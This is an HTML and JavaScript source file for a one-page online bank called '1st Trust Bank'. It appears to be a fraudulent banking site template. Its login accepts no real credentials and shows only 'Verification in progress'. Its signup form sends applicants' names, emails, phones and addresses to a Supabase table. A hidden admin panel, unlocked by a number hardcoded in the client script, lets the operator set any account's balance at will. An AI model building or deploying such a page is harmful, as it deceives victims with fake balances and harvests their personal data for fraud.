<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>1st Trust Bank</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
body { background: #0f172a; color: white; font-family: sans-serif; }
.glass-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
.input-box { background: #0f172a; border: 1px solid #334155; padding: 12px; width: 100%; border-radius: 8px; margin-bottom: 10px; }
</style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">

<div id="main-ui" class="glass-card p-8 rounded-3xl w-full max-w-sm text-center shadow-2xl">
<h1 class="text-xs font-bold text-emerald-400 uppercase tracking-widest mb-1">1st Trust Bank</h1>
<h2 class="text-3xl font-extrabold mb-6">Simple, Fast<br>Online Banking</h2>

<div class="bg-slate-900 p-6 rounded-2xl mb-6 border border-slate-700">
<p class="text-xs text-slate-400 uppercase mb-1">Checking Account</p>
<p class="text-xl font-mono font-bold text-white mb-4">1T-902-8842</p>
<div class="flex justify-between text-xs">
<span class="text-emerald-400">● Active Connection</span>
<span>2026</span>
</div>
</div>

<button onclick="document.getElementById('login-ui').classList.remove('hidden'); document.getElementById('main-ui').classList.add('hidden')" class="w-full bg-emerald-500 text-slate-900 font-bold py-3 rounded-xl mb-3">LOG IN</button>
<button onclick="document.getElementById('apply-ui').classList.remove('hidden'); document.getElementById('main-ui').classList.add('hidden')" class="w-full border border-slate-600 text-white font-bold py-3 rounded-xl">OPEN ACCOUNT</button>
</div>

<div id="login-ui" class="hidden glass-card p-8 rounded-3xl w-full max-w-sm">
<h2 class="text-xl font-bold mb-4">Account Login</h2>
<input type="text" id="user-id" placeholder="Account Number" class="input-box">
<input type="password" id="pass-id" placeholder="Password" class="input-box">
<button onclick="handleLogin()" class="w-full bg-emerald-500 py-3 rounded-xl font-bold">SIGN IN</button>
</div>

<div id="apply-ui" class="hidden glass-card p-8 rounded-3xl w-full max-w-sm">
<h2 class="text-xl font-bold mb-4">Open Account</h2>
<input type="text" id="full-name" placeholder="Full Name" class="input-box">
<input type="email" id="email" placeholder="Email" class="input-box">
<input type="text" id="phone" placeholder="Phone" class="input-box">
<input type="text" id="address" placeholder="Address" class="input-box">
<input type="text" id="country" placeholder="Country" class="input-box">
<button onclick="handleSignup()" class="w-full bg-emerald-500 py-3 rounded-xl font-bold">SUBMIT</button>
</div>

<div id="admin-panel" class="hidden fixed inset-0 bg-slate-900 p-10">
<h2 class="text-2xl font-bold mb-5">Admin Panel</h2>
<input type="text" id="target-id" placeholder="Account Number" class="input-box">
<input type="number" id="balance-val" placeholder="New Balance" class="input-box">
<button onclick="updateBalance()" class="bg-blue-600 p-3 rounded w-full">SAVE BALANCE</button>
</div>

<script>
const sb = supabase.createClient('YOUR_SUPABASE_URL', 'YOUR_SUPABASE_KEY');
const ADMIN_ID = "08059422423";

async function handleLogin() {
const u = document.getElementById('user-id').value;
const p = document.getElementById('pass-id').value;
if (u === ADMIN_ID && p === ADMIN_ID) {
document.getElementById('admin-panel').classList.remove('hidden');
} else {
alert("Verification in progress.");
}
}

async function handleSignup() {
const accNum = '1T-' + Math.floor(10000000 + Math.random() * 90000000);
const { error } = await sb.from('users').insert([{
full_name: document.getElementById('full-name').value,
email: document.getElementById('email').value,
phone: document.getElementById('phone').value,
address: document.getElementById('address').value,
country: document.getElementById('country').value,
account_number: accNum
}]);
if (error) alert("Error: " + error.message);
else alert("Success! Your Account: " + accNum);
}

async function updateBalance() {
const acc = document.getElementById('target-id').value;
const bal = document.getElementById('balance-val').value;
const { error } = await sb.from('users').update({ balance: bal }).eq('account_number', acc);
if (error) alert("Error: " + error.message);
else alert("Balance updated!");
}
</script>
</body>
</html>
